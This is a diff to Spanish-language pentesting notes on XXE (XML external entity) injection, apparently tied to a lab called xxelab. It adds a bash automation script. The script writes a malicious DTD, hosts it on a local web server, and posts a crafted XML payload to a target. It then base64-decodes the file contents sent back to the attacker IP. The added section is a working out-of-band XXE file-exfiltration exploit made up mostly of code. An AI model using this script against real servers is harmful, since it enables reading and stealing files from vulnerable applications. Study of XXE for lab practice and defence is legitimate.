@@ -49,6 +49,33 @@ POST http://example.com/xml HTTP/1.1
 `file://` - muestra la salida como esta originalmente
 `php://filter/convert.base64-encode/resource=`
 
+## Automatizacion
+```bash
+#!/bin/bash
+
+echo; echo "Escribe la ruta del archivo a obtener: " && read -r myFile
+
+echo """<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFile\">
+<!ENTITY % eval '<!ENTITY &#x25; exfile SYSTEM \"http://192.168.100.19/?file=%file;\">'>
+%eval;
+%exfile;""" > hack.dtd
+
+python3 -m http.server 80 &>response &
+
+PID=$!
+sleep 1
+
+curl -s -X GET "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % myName SYSTEM "http://192.168.100.19/hack.dtd"> %myName; ]>
+<root><name>cele</name><tel>123456789</tel><email>
+cele@cele.com
+</email><password>cele1234</password></root>' 1>/dev/null
+
+kill -9 $PID
+wait $PID 2>/dev/null
+
+echo; cat response | grep -oP "file=\K[^.*\s]+" | base64 -d 
+```
 ## Herramientas
 - [[xxelab]]
 
